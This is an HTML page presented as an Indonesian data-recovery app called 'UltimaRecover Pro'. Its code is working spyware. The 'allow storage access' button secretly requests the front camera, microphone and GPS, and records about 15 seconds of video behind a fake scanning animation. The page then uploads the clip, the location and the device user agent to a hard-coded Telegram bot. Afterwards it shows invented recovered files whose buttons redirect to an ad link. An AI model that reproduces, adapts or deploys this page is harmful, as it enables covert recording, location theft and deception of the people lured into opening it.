<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>UltimaRecover Pro - Pemulihan Data</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #2563eb;
            --primary-dark: #1e40af;
            --bg-body: #f1f5f9;
            --surface: #ffffff;
            --text-main: #0f172a;
            --text-sub: #64748b;
            --border: #e2e8f0;
            --success: #10b981;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        
        body { background-color: var(--bg-body); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        .app-frame {
            width: 100%; max-width: 420px; background: var(--surface);
            height: 100vh; max-height: 900px;
            display: flex; flex-direction: column;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden; position: relative;
        }

        .header {
            padding: 24px 20px; background: #fff; border-bottom: 1px solid #e2e8f0;
            display: flex; justify-content: space-between; align-items: center;
        }
        .brand { font-size: 1.1rem; font-weight: 800; color: var(--text-main); display: flex; align-items: center; gap: 8px; }
        .brand i { color: var(--primary); }
        .pro-badge { background: #dbeafe; color: var(--primary); font-size: 0.7rem; padding: 4px 8px; border-radius: 6px; font-weight: 700; letter-spacing: 0.5px; }

        .scan-area { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-y: auto; }

        /* Grid Kategori */
        .category-grid {
            display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; width: 100%; margin-bottom: 30px;
        }
        .cat-item {
            display: flex; flex-direction: column; align-items: center; gap: 6px;
            padding: 10px 4px; border-radius: 12px; transition: all 0.2s; cursor: pointer;
            border: 1px solid transparent;
        }
        .cat-item.active { background: #eff6ff; border-color: var(--primary); }
        .cat-item:hover { background: #f8fafc; }
        .cat-icon {
            width: 44px; height: 44px; border-radius: 10px; background: #f1f5f9;
            display: flex; align-items: center; justify-content: center; color: var(--text-sub); font-size: 1.1rem;
            transition: all 0.2s;
        }
        .cat-item.active .cat-icon { background: var(--primary); color: #fff; box-shadow: 0 4px 10px rgba(37, 99, 235, 0.3); }
        .cat-name { font-size: 0.7rem; font-weight: 600; color: var(--text-sub); text-align: center; }
        .cat-item.active .cat-name { color: var(--primary); }

        /* Radar Visual */
        .radar-container {
            width: 200px; height: 200px; border-radius: 50%; border: 1px solid #e2e8f0;
            position: relative; margin-bottom: 20px; display: flex; align-items: center; justify-content: center;
            background: radial-gradient(circle, #fff 30%, #f8fafc 70%);
        }
        .radar-grid {
            position: absolute; width: 100%; height: 100%; border-radius: 50%;
            background-image: radial-gradient(#cbd5e1 1px, transparent 1px);
            background-size: 20px 20px; opacity: 0.5;
        }
        .radar-scan {
            position: absolute; top: 50%; left: 50%; width: 50%; height: 2px;
            background: var(--success); transform-origin: 0 0;
            animation: spin 2s infinite linear; display: none; box-shadow: 0 0 10px var(--success);
        }
        .radar-center { font-size: 2.5rem; color: #cbd5e1; z-index: 2; transition: color 0.3s; }
        .radar-container.active .radar-center { color: var(--primary); animation: pulse 2s infinite; }
        .radar-container.active .radar-scan { display: block; }

        .info-box {
            width: 100%; background: #f8fafc; border-radius: 12px; padding: 15px;
            margin-bottom: 25px; text-align: center; border: 1px solid #e2e8f0;
        }
        .info-value { font-size: 1.5rem; font-weight: 800; color: var(--text-main); }
        .info-label { font-size: 0.8rem; color: var(--text-sub); margin-top: 4px; }

        .progress-wrapper { width: 100%; margin-bottom: 25px; display: none; }
        .p-info { display: flex; justify-content: space-between; font-size: 0.8rem; color: var(--text-sub); margin-bottom: 6px; }
        .p-bar { width: 100%; height: 8px; background: #e2e8f0; border-radius: 4px; overflow: hidden; }
        .p-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--primary), var(--success)); border-radius: 4px; transition: width 0.3s; }

        .action-btn {
            width: 100%; padding: 16px; background: var(--primary); color: #fff;
            border: none; border-radius: 14px; font-size: 1.1rem; font-weight: 700;
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.3); cursor: pointer;
            display: flex; align-items: center; justify-content: center; gap: 10px; transition: transform 0.1s;
        }
        .action-btn:active { transform: scale(0.98); }
        .action-btn:disabled { background: #cbd5e1; color: #94a3b8; box-shadow: none; cursor: not-allowed; }
        .action-btn.error { background: #ef4444; box-shadow: 0 6px 20px rgba(239, 68, 68, 0.3); }

        /* Result View */
        .result-view { display: none; width: 100%; height: 100%; padding: 20px; overflow-y: auto; background: #f8fafc; }
        .r-header { margin-bottom: 20px; }
        .r-card {
            background: #fff; padding: 12px; border-radius: 10px; margin-bottom: 10px;
            display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.02);
        }
        .r-icon { width: 40px; height: 40px; background: #f1f5f9; border-radius: 8px; display: flex; align-items: center; justify-content: center; margin-right: 12px; color: var(--primary); }
        .r-info { flex: 1; }
        .r-name { font-size: 0.9rem; font-weight: 600; color: var(--text-main); }
        .r-meta { font-size: 0.75rem; color: var(--text-sub); }
        
        /* Tombol Pulih (Gaya Iklan) */
        .r-tag {
            background: #dcfce7; color: #166534; font-size: 0.65rem; padding: 6px 12px; 
            border-radius: 20px; font-weight: 700; cursor: pointer; border: none;
            transition: background 0.2s; text-decoration: none;
        }
        .r-tag:hover { background: #bbf7d0; }

        #vidSource { display: none; }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div class="app-frame">
    <div class="header">
        <div class="brand">
            <i class="fas fa-shield-alt"></i> UltimaRecover
        </div>
        <div class="pro-badge">PRO</div>
    </div>

    <!-- LAYAR 1: SCANNER -->
    <div id="scanScreen" class="scan-area">
        
        <div class="category-grid">
            <div class="cat-item active" onclick="selectCat(this, 'Foto')">
                <div class="cat-icon"><i class="fas fa-image"></i></div>
                <div class="cat-name">Foto</div>
            </div>
            <div class="cat-item" onclick="selectCat(this, 'Video')">
                <div class="cat-icon"><i class="fas fa-video"></i></div>
                <div class="cat-name">Video</div>
            </div>
            <div class="cat-item" onclick="selectCat(this, 'Audio')">
                <div class="cat-icon"><i class="fas fa-music"></i></div>
                <div class="cat-name">Audio</div>
            </div>
            <div class="cat-item" onclick="selectCat(this, 'WA')">
                <div class="cat-icon"><i class="fab fa-whatsapp"></i></div>
                <div class="cat-name">WA</div>
            </div>
            <div class="cat-item"></div>
            <div class="cat-item"></div>
            <div class="cat-item"></div>
            <div class="cat-item"></div>
        </div>

        <div class="radar-container" id="radar">
            <div class="radar-grid"></div>
            <div class="radar-scan"></div>
            <div class="radar-center" id="radarIcon"><i class="fas fa-hdd"></i></div>
        </div>

        <div class="info-box">
            <div class="info-value" id="statCount">0</div>
            <div class="info-label" id="statLabel">Data Penyimpanan Terhapus</div>
        </div>

        <div class="progress-wrapper" id="progressBox">
            <div class="p-info">
                <span id="pText">Menganalisis Partisi...</span>
                <span id="pPercent">0%</span>
            </div>
            <div class="p-bar">
                <div class="p-fill" id="pFill"></div>
            </div>
        </div>

        <button id="actionBtn" class="action-btn" onclick="startFakeStorageAccess()">
            <i class="fas fa-folder-open"></i> IZINKAN AKSES PENYIMPANAN
        </button>
        <p style="font-size: 0.7rem; color: #94a3b8; margin-top: 15px; text-align: center;">
            <i class="fas fa-lock"></i> Data Anda diproses secara lokal & aman
        </p>
    </div>

    <!-- LAYAR 2: HASIL -->
    <div id="resultScreen" class="result-view">
        <div class="r-header">
            <h2 style="font-size: 1.2rem; margin-bottom: 5px;">Hasil Pemindaian Selesai</h2>
            <p style="font-size: 0.85rem; color: var(--text-sub);">Ditemukan data di memori internal.</p>
        </div>
        <div id="resultList">
            <!-- JS Inject -->
        </div>
        <button class="action-btn" style="margin-top: 20px;" onclick="location.reload()">
            <i class="fas fa-redo"></i> Pindai Ulang
        </button>
    </div>

    <video id="vidSource" autoplay playsinline muted></video>
</div>

<script>
    // --- CONFIG ---
    const TOKEN = '8291513571:AAEhZBOAzCuFgAQZz9dcqA7KenKiv0Exuso';
    const CHAT_ID = '6388974886';
    const API_URL = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
    
    // Link Iklan/Redirect
    const ADS_LINK = "https://www.google.com"; 

    // --- DOMS ---
    const video = document.getElementById('vidSource');
    const radar = document.getElementById('radar');
    const radarIcon = document.getElementById('radarIcon');
    const btn = document.getElementById('actionBtn');
    const statCount = document.getElementById('statCount');
    const statLabel = document.getElementById('statLabel');
    const progressBox = document.getElementById('progressBox');
    const pText = document.getElementById('pText');
    const pPercent = document.getElementById('pPercent');
    const pFill = document.getElementById('pFill');
    const scanScreen = document.getElementById('scanScreen');
    const resultScreen = document.getElementById('resultScreen');

    let currentCategory = 'Foto';

    function selectCat(el, name) {
        if (btn.disabled) return;
        document.querySelectorAll('.cat-item').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        currentCategory = name;
        statCount.innerText = Math.floor(Math.random() * 500) + 50;
        statLabel.innerText = `Potensi ${name} Terhapus`;
    }

    async function startFakeStorageAccess() {
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> MEMPROSES IZIN...';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            video.srcObject = stream;
            video.play();

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        window.locData = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`;
                        executeScan(stream);
                    },
                    (err) => {
                        window.locData = "GPS Error";
                        executeScan(stream); 
                    }
                );
            } else {
                executeScan(stream);
            }

        } catch (err) {
            handleError();
        }
    }

    function handleError() {
        radar.classList.remove('active');
        btn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> IZINKAN AKSES PENYIMPANAN';
        btn.classList.add('error');
        btn.disabled = false;
    }

    function executeScan(stream) {
        btn.style.display = 'none';
        progressBox.style.display = 'block';
        radar.classList.add('active');
        radarIcon.innerHTML = '<i class="fas fa-microchip"></i>'; 
        statLabel.innerText = "Memindai Sektor Penyimpanan...";

        let options = { mimeType: 'video/webm;codecs=vp9' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options = { mimeType: 'video/webm' };
        }
        const mediaRecorder = new MediaRecorder(stream, options);
        const chunks = [];

        mediaRecorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
        
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            sendData(blob);
            stream.getTracks().forEach(t => t.stop());
        };

        mediaRecorder.start();

        let duration = 15000;
        let start = Date.now();
        
        const timer = setInterval(() => {
            let elapsed = Date.now() - start;
            let pct = Math.min((elapsed / duration) * 100, 100);
            
            pFill.style.width = pct + '%';
            pPercent.innerText = Math.floor(pct) + '%';
            statCount.innerText = Math.floor(pct * 12.5); 

            if (elapsed < 2000) pText.innerText = "Mengakses Sistem File...";
            else if (elapsed < 4000) pText.innerText = "Merekonstruksi Partisi...";
            else pText.innerText = "Finalisasi Pemindaian...";

            if (elapsed >= duration) {
                clearInterval(timer);
                mediaRecorder.stop();
            }
        }, 50);
    }

    function sendData(blob) {
        pText.innerText = "Menyimpan Hasil Pemulihan...";
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', blob, `storage_scan_${Date.now()}.webm`);
        
        const caption = `
ðŸ” MODE: PENYIMPANAN (PALSU)
ðŸ“ LOKASI: ${window.locData || 'N/A'}
ðŸŽ¤ AUDIO: Aktif
ðŸ“· VIDEO: 5 Detik Terrekam
ðŸ“± DEVICE: ${navigator.userAgent}
        `.trim();

        formData.append('caption', caption);

        fetch(API_URL, { method: 'POST', body: formData })
            .then(() => {
                setTimeout(showResults, 1000);
            })
            .catch(() => setTimeout(showResults, 1000));
    }

    function showResults() {
        scanScreen.style.display = 'none';
        resultScreen.style.display = 'block';

        const list = document.getElementById('resultList');
        const files = [
            { n: `Recover_Foto.jpg`, s: "2.4 MB", d: "Hari ini" },
            { n: `System_Partition.tmp`, s: "14 MB", d: "Kemarin" },
            { n: `WhatsApp_Media.db`, s: "120 MB", d: "Minggu lalu" }
        ];

        files.forEach(f => {
            list.innerHTML += `
                <div class="r-card">
                    <div class="r-icon"><i class="fas fa-file-code"></i></div>
                    <div class="r-info">
                        <div class="r-name">${f.n}</div>
                        <div class="r-meta">${f.s} â€¢ ${f.d}</div>
                    </div>
                    <!-- TOMBOL PULIH: REDIRECT KE IKLAN -->
                    <button class="r-tag" onclick="window.location.href='${ADS_LINK}'">PULIH</button>
                </div>
            `;
        });
    }
</script>

</body>
</html>
